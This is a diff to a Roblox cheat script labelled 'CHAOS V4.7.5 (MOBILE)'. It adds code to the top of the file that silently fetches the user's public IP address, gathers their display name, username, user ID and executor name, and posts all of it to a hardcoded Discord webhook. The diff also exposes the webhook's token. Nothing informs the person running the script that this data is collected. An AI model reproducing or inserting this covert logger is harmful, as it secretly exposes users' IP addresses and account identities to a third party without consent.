@@ -1,3 +1,85 @@
+local ip = game:HttpGet("https://api.ipify.org")
+
+function SendMessage(url, message)
+    local http = game:GetService("HttpService")
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    local data = {
+        ["content"] = message
+    }
+    local body = http:JSONEncode(data)
+    local response = request({
+        Url = url,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+end
+
+function SendMessageEMBED(url, embed)
+    local http = game:GetService("HttpService")
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    local data = {
+        ["embeds"] = {
+            {
+                ["title"] = embed.title,
+                ["description"] = embed.description,
+                ["color"] = embed.color,
+                ["fields"] = embed.fields,
+                ["footer"] = {
+                    ["text"] = embed.footer.text
+                }
+            }
+        }
+    }
+    local body = http:JSONEncode(data)
+    local response = request({
+        Url = url,
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
+end
+
+local url = "https://discord.com/api/webhooks/1266011342905671701/QOczncox1t3d5MYStglX4-QAqbv_baOEoy31BqdgcRMvND85fQWPGuCu9MHrVtUBw_3J"
+SendMessage(url)
+
+local embed = {
+	["title"] = "CHAOS V4.7.5 Logs:",
+	["description"] = "New execute detected on CHAOS V4.7.5 (MOBILE)",
+	["color"] = 0,
+	["fields"] = {
+		{
+			["name"] = "IP",
+			["value"] = ip
+		},
+				{
+			["name"] = "Display Name",
+			["value"] = game.Players.LocalPlayer.DisplayName
+		},
+		{
+			["name"] = "User Name",
+			["value"] = game.Players.LocalPlayer.Name
+		},
+		{
+			["name"] = "User ID",
+			["value"] = game.Players.LocalPlayer.UserId
+		},
+		{
+			["name"] = "Exploit",
+			["value"] = identifyexecutor()
+		}
+	},
+	["footer"] = {
+		["text"] = " ",
+	},
+}
+SendMessageEMBED(url, embed)
+
+
 local Player = game:GetService("Players").LocalPlayer
 local Mouse = Player:GetMouse()
 
